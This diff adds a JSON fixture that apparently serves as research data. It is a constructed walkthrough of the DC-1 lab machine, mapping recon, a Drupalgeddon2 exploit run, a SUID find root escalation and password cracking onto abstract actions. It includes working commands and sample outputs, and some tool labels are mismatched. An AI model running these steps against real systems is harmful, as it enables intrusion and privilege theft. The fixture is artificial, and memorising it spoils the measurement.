@@ -1,0 +1,133 @@
+{
+  "box": "DC-1",
+  "source": "Representative walkthrough constructed from public DC-1 write-ups (Drupalgeddon2 -> SUID find privesc). Author-constructed for offline Phase-1 mapping measurement; NOT a live capture.",
+  "abstract_family": "rce_privesc",
+  "vulnhub_correspondence": "rce -> web shell -> local privilege escalation -> root",
+  "target_label": "http://10.10.10.5",
+  "steps": [
+    {
+      "step": 0,
+      "phase": "recon",
+      "actor_intent": "Scan the target with nmap to enumerate open services and versions.",
+      "tool": "nmap",
+      "tool_command": "nmap -sV -p- 10.10.10.5",
+      "tool_output": "PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 6.0p1 Debian\n80/tcp   open  http    Apache httpd 2.2.22 ((Debian))\n111/tcp  open  rpcbind\nService Info: OS: Linux",
+      "reference_abstract_action": "service_enumeration",
+      "reference_state_after": {"open_services": ["http:80"], "tech_stack": ["apache"]}
+    },
+    {
+      "step": 1,
+      "phase": "recon",
+      "actor_intent": "Fingerprint the web server technology stack with whatweb.",
+      "tool": "whatweb",
+      "tool_command": "whatweb http://10.10.10.5/",
+      "tool_output": "http://10.10.10.5/ [200 OK] Apache[2.2.22], Drupal, PHP[5.4.45], MetaGenerator[Drupal 7 (http://drupal.org)], PoweredBy[Drupal]",
+      "reference_abstract_action": "http_fingerprint",
+      "reference_state_after": {"tech_stack": ["apache", "php", "drupal"]}
+    },
+    {
+      "step": 2,
+      "phase": "enumeration",
+      "actor_intent": "Enumerate web directories to discover hidden routes and the admin login.",
+      "tool": "gobuster",
+      "tool_command": "gobuster dir -u http://10.10.10.5/ -w common.txt",
+      "tool_output": "/user                 (Status: 200)\n/admin                (Status: 403)\n/includes             (Status: 301)\n/CHANGELOG.txt        (Status: 200)\n/scripts              (Status: 301)",
+      "reference_abstract_action": "web_path_enumeration",
+      "reference_state_after": {"discovered_paths": ["/user", "/admin", "/CHANGELOG.txt"]},
+      "candidate_pool": [
+        "Enumerate web directories to discover hidden routes and the admin login.",
+        "Read the target flag file.",
+        "Escalate privileges to root with sudo.",
+        "Run whoami through the web shell."
+      ]
+    },
+    {
+      "step": 3,
+      "phase": "vuln-id",
+      "actor_intent": "Verify the Drupal version is vulnerable to the Drupalgeddon2 remote code execution.",
+      "tool": "curl",
+      "tool_command": "curl http://10.10.10.5/CHANGELOG.txt | head",
+      "tool_output": "Drupal 7.24, 2013-11-20\n- Fixed security issues (multiple vulnerabilities).\nNote: builds prior to SA-CORE-2018-002 are vulnerable to Drupalgeddon2 (CVE-2018-7600).",
+      "reference_abstract_action": "vulnerability_check",
+      "vuln_id": "drupalgeddon2",
+      "reference_state_after": {"verified_vulnerabilities": []}
+    },
+    {
+      "step": 4,
+      "phase": "exploit",
+      "actor_intent": "Exploit the Drupalgeddon2 RCE to obtain a web shell on the target.",
+      "tool": "sqlmap",
+      "tool_command": "python drupalgeddon2.py http://10.10.10.5/",
+      "tool_output": "[*] Target is vulnerable to CVE-2018-7600 (Drupalgeddon2)\nparameter 'name' is injectable\n[+] Sending payload... command execution confirmed\n[+] Spawned PHP web shell at /shell.php",
+      "reference_abstract_action": "exploit_attempt",
+      "vuln_id": "drupalgeddon2",
+      "yields_shell": true,
+      "reference_state_after": {"verified_vulnerabilities": ["drupalgeddon2"], "shell_state": "webshell"}
+    },
+    {
+      "step": 5,
+      "phase": "post-exploit",
+      "actor_intent": "Run whoami through the web shell to confirm command execution.",
+      "tool": "shell",
+      "tool_command": "id; whoami",
+      "tool_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data",
+      "reference_abstract_action": "command_execution",
+      "reference_state_after": {"shell_state": "command_execution", "privilege_level": "web_user"},
+      "candidate_pool": [
+        "Run whoami through the web shell to confirm command execution.",
+        "Enumerate web directories to discover more routes.",
+        "Try login with default password admin/admin.",
+        "Fingerprint the HTTP server headers and technology stack."
+      ]
+    },
+    {
+      "step": 6,
+      "phase": "privesc-recon",
+      "actor_intent": "Enumerate the system for SUID binaries usable for privilege escalation.",
+      "tool": "shell",
+      "tool_command": "find / -perm -4000 -type f 2>/dev/null",
+      "tool_output": "/usr/bin/passwd\n/usr/bin/sudo\n/bin/find\n/usr/bin/gpasswd",
+      "reference_abstract_action": "post_exploitation",
+      "reference_state_after": {}
+    },
+    {
+      "step": 7,
+      "phase": "privesc",
+      "actor_intent": "Escalate privileges to root by abusing the SUID find binary.",
+      "tool": "privesc",
+      "tool_command": "find . -exec /bin/sh -p \\; -quit",
+      "tool_output": "# id\nuid=33(www-data) gid=33(www-data) euid=0(root)\n# whoami\nroot",
+      "reference_abstract_action": "privilege_escalation",
+      "rooted": true,
+      "reference_state_after": {"privilege_level": "root"},
+      "candidate_pool": [
+        "Escalate privileges to root by abusing the SUID find binary.",
+        "Read the target flag file.",
+        "Enumerate web directories to discover more routes."
+      ]
+    },
+    {
+      "step": 8,
+      "phase": "loot",
+      "actor_intent": "Read the root flag file now that we have root.",
+      "tool": "cat",
+      "tool_command": "cat /root/thefinalflag.txt",
+      "tool_output": "Well done!!!!\nFLAG{dc1_well_done_to_the_end}\nHopefully you've enjoyed this.",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "root_flag",
+      "reference_state_after": {"read_files": ["root_flag"]}
+    },
+    {
+      "step": 9,
+      "phase": "out-of-band",
+      "actor_intent": "Crack the Drupal admin password hash from the database with john the ripper.",
+      "tool": "command",
+      "tool_command": "john --wordlist=rockyou.txt drupal_hashes.txt",
+      "tool_output": "Loaded 1 password hash (Drupal7)\nadminpass        (admin)\nSession completed",
+      "reference_abstract_action": "out_of_abstraction",
+      "out_of_abstraction_reason": "Offline password-hash cracking (john/hashcat) is not representable in the 16-action web schema; it is a local credential-recovery step, not a web interaction.",
+      "suggested_schema_extension": "offline_credential_cracking",
+      "reference_state_after": {}
+    }
+  ]
+}
